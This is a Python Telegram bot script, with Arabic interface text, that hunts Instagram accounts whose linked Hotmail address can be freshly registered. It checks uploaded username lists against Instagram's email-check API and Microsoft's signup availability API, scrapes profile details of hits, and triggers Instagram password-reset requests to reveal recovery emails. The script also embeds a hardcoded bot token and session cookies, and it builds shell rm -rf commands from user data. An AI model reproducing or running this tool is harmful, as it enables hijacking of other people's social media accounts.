import requests 
import telebot 
from telebot import types
import requests
from uuid import uuid4
import random
import os,re
from re import *
import json
from user_agent import generate_user_agent
import sys
from datetime import datetime
from bs4 import BeautifulSoup
import datetime
import secrets
cokie  = secrets.token_hex(8)*2
zzk=0

tok= "6747653473:AAGRo6WMhuCA35SNFFvDfcRgVs6nsxQEQOw" 
	
print('\n')
print('روح للبوت دز start/')
bot = telebot.TeleBot(tok)
zxu = datetime.datetime.now()
@bot.message_handler(commands=['start'])
def start(message):
 global zzk
 zzk+=1
 nm = message.from_user.first_name
 id2 = message.from_user.id
 userk = message.from_user.username
 zxu = datetime.datetime.now()
 tt=f'''
عضو يستخدم البوت…
ـــــــــــــــــــــــــــــــــــــــ
اسم المستخدم : {nm}
يوزر المستخدم : @{userk}
ايدي المستخدم : {id2}
رقم المستخدم  : {zzk}
الوقت : {zxu}
ـــــــــــــــــــــــــــــــــــــــ
ـ @LLL22LL2'''

 key = types.InlineKeyboardMarkup()
 bot.send_message(message.chat.id, f"<strong>{tt}</strong>",parse_mode="html",reply_markup=key)
 

 
 ch = types.InlineKeyboardButton(text ="أبـدأ فحـص لـسته انسـتا ", callback_data = 'list')
 kk = types.InlineKeyboardButton(text =" حـذف الـسته القـديمه ", callback_data = 'ttl')
 az = types.InlineKeyboardButton(text ="المبرمج: @LLL22LL2", url = 'https://t.me/LLL22LL2')
 fr = message.from_user.first_name
 maac = types.InlineKeyboardMarkup()
 maac.row_width=2
 maac.add(ch,kk,az,)
 bot.send_message(message.chat.id,f"<strong>اهلا بك : | {fr} | في بـوت فـحص  لـسته  انسـتكرام للحصول على معلوماتك [ /info ]</strong>",parse_mode="html",reply_markup=maac)
@bot.callback_query_handler(func=lambda call:True)
def st(call):
 
 
 if call.data== 'list':
            nc1 = types.InlineKeyboardMarkup(row_width=2)
            message= bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل لسـته انستكرام لـيتم الفحص ',reply_markup=nc1)
            bot.register_next_step_handler(message,k1,message.id)


 elif call.data== 'ttl':
  nc1 = types.InlineKeyboardMarkup(row_width=2)
  MC = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل كـلمه حـذف ',reply_markup=nc1)
  bot.register_next_step_handler(MC,k2)


def k1(message,id):
	iid = str(message.from_user.id)
	aol1=0
	face1=0
	face2=0
	aol2=0
	eerr=0
	zzoy=0
	addad=0
	try:
		filename = message.document.file_name
		file_info = bot.get_file(message.document.file_id)
		use = bot.download_file(file_info.file_path)		
		with open(f'userzaidtool{iid}.txt', 'wb') as (zaidno):
			zaidno.write(use)
	except:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خـطأ فـي الـملف</strong>",parse_mode="html",reply_markup=key)
	try:
		file = open(f'userzaidtool{iid}.txt','r').read().splitlines()
		addd = len(open(f"userzaidtool{iid}.txt").read().splitlines())
	except FileNotFoundError as error:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>هنـاك خطـأ او مشـكله مـا </strong>",parse_mode="html",reply_markup=key)
	for zood in file:
			addad+=1
			zzoy+=1
			try:
				email = (zood).split('@')[0]+'@hotmail.com'
			except:
				email = (zood)+'@hotmail.com'
				eerr+=1				

			try:
			         url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
			         head= {	
		 'Host': 'www.instagram.com',
		 'origin': 'https://www.instagram.com',
		 'referer': 'https://www.instagram.com/accounts/signup/email/',	
		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
		 'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
	}
						
			         data = {
	'email':f'{email}'
	}
			
			         try:
			         	r= requests.post(url,headers=head,data=data).text
			         except:
			         	eerr+=1
			         if 'email_is_taken' in r:
			         	face1+=1
			         	email=email.split('@')[0]+'@hotmail.com'
			         	try:
			         		reqz=requests.Session();headers = {
"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
"Host": "signup.live.com",
"Connection": "keep-alive",
"X-Requested-With": "XMLHttpRequest"
    };url="https://signup.live.com/signup.aspx?lic=1";response=reqz.get(url, headers=headers)
			         		apiCanary = search("apiCanary\":\"(.+?)\",", str(response.content)).group(1)
			         		apiCanary = str.encode(apiCanary).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii");url  = "https://signup.live.com/API/CheckAvailableSigninNames";json = {
"signInName": email,
"includeSuggestions": True};res = reqz.post(url, headers={
"Content-Type":"application/x-www-form-urlencoded; charset=utf-8",
"canary":apiCanary
}, json=json)
			         	except:
			         		eerr+=1
			         	if res.json()["isAvailable"]==False:
			         		aol2+=1	         		
			         	else:
			         		aol1+=1
			         		try:
			         			user=email.split('@')[0]
			         			urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
			         			he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}

			         			re =requests.get(urlg, headers=he).json()
			         			io = re['data']['user']['biography']
			         			fol = re['data']['user']['edge_followed_by']['count']
			         			fos = re['data']['user']['edge_follow']['count']
			         			ido = re['data']['user']['id']
			         			nam = re['data']['user']['full_name']
			         			isp = re['data']['user']['is_private']
			         			op = re['data']['user']['edge_owner_to_timeline_media']['count']
			         			try:
			         				re = requests.get(f"https://o7aa.pythonanywhere.com/?id={ido}")   
			         				ree = re.json()
			         				date = ree['date']
			         			except:
			         				date="Not Data"
			         				print('No Date')
			         			heeee = {
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Host': 'i.instagram.com',
'Connection': 'Keep-Alive',
'User-Agent': generate_user_agent(),
'Accept-Language': 'en-US',
'X-IG-Connection-Type': 'WIFI',
'X-IG-Capabilities': 'AQ==',
'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
      };daaa = {
'ig_sig_key_version': '4',
"user_id":ido};urr = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'

			         			try:
			         				reeee = requests.post(urr,headers=heeee,data=daaa).json()
			         				rest = reeee['obfuscated_email']
			         			except:
			         				rest='No Rest'
			         			ff =f'''
🎖═══════════════════
🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
🗞 𝐈𝐃 ﴾ {ido} ﴿
📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
🎖═══════════════════
🤴 𝐁𝐘 ﴾ @LLL22LL2 ﴿'''
			         			key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
			         		except:
			         			ff=f'''
Not info In Instagram
Email : {email}
Dev: @LLL22LL2''';key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)				    
			         else:
			         	face2+=1
			except:
			         eerr+=1
			try:
				ba12=types.InlineKeyboardButton(f"Error Email : {eerr}",callback_data='b12')
				mees = types.InlineKeyboardMarkup(row_width=2)
				ba0=types.InlineKeyboardButton(f"Developer : @LLL22LL2",callback_data='b0')
				ba1=types.InlineKeyboardButton(f"Email : {email}",callback_data='b1')
				ba2=types.InlineKeyboardButton(f"God Insta  : {face1}",callback_data='b2')
				ba3=types.InlineKeyboardButton(f"God Gmail : {aol1}",callback_data='b3')
				ba5=types.InlineKeyboardButton(f"BaD gmail : {aol2}",callback_data='b5')
				ba6=types.InlineKeyboardButton(f"Bad Insta : {face2}",callback_data='b6')
				ba7=types.InlineKeyboardButton(f" @LLL22LL2",callback_data='b7')
				ba11=types.InlineKeyboardButton(f" List : {addd} | ok : {addad}",callback_data='b11')
				mees.add(ba0,ba7,ba2,ba3,ba5,ba6,ba11,ba12,ba1)
				bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="بدأ صيـد مـتـاحـات انـستكرام حـضاً مـوفقاً",parse_mode='markdown',reply_markup=mees)
			except:
				pass
			try:
				if addd == addad:
					key = types.InlineKeyboardMarkup()
					bot.send_message(message.chat.id, f"<strong>لـقد انـتهى فـحص الـسته</strong>",parse_mode="html",reply_markup=key)
					os.system(f'rm -rf userzaidtool{id}.txt')
			except:
				pass

def k2(message):
	id = str(message.from_user.id)
	tn=str(message.text)
	if 'حذف' in tn:
		os.system(f'rm -rf userzaidtool{id}.txt')
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>تـم حـذف لسـتاتـك القـديمه</strong>",parse_mode="html",reply_markup=key)
	else:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>لـقد أرسـلت الكـلمه بشـكل خطأ</strong>",parse_mode="html",reply_markup=key)

						
@bot.message_handler(commands=["info"])
def inf(message):
    global zzk
    zzk+=1
    zxu = datetime.datetime.now()
    nm = message.from_user.first_name
    id2 = message.from_user.id
    userk = message.from_user.username
    bio = bot.get_chat(message.from_user.id).bio
    
    ttg=f'''
رتبتك هي عضو 🥰 
ـــــــــــــــــــــــــــــــــــــــ
اسم المستخدم : {nm}
يوزر المستخدم : @{userk}
ايدي المستخدم : {id2}
رقم المستخدم  : {zzk}
الوقت : {zxu}
بايو المستخدم : {bio}
ـــــــــــــــــــــــــــــــــــــــ
ـ @LLL22LL2'''
    key = types.InlineKeyboardMarkup()
    bot.send_message(message.chat.id, f"<strong>{ttg}</strong>",parse_mode="html",reply_markup=key) 	


while True :
    try:
        bot.infinity_polling()
    except:
        print('Error')
